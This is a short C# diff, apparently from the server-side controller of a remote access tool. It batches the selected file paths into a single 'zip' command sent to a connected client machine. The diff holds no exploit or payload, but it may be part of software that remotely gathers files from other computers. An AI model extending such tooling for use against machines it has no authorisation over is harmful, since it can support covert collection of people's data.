@@ -426,15 +426,18 @@ namespace Server.Forms
             {
                 if (listView1.SelectedItems.Count > 0)
                 {
+                    StringBuilder files = new StringBuilder();
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
-                        MsgPack msgpack = new MsgPack();
-                        msgpack.ForcePathObject("Packet").AsString = "fileManager";
-                        msgpack.ForcePathObject("Command").AsString = "zip";
-                        msgpack.ForcePathObject("Path").AsString = itm.ToolTipText;
-                        msgpack.ForcePathObject("Zip").AsString = "true";
-                        ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+                        files.Append(itm.ToolTipText + "-=>");
+
                     }
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                    msgpack.ForcePathObject("Command").AsString = "zip";
+                    msgpack.ForcePathObject("Path").AsString = files.ToString();
+                    msgpack.ForcePathObject("Zip").AsString = "true";
+                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 }
             }
             catch { }
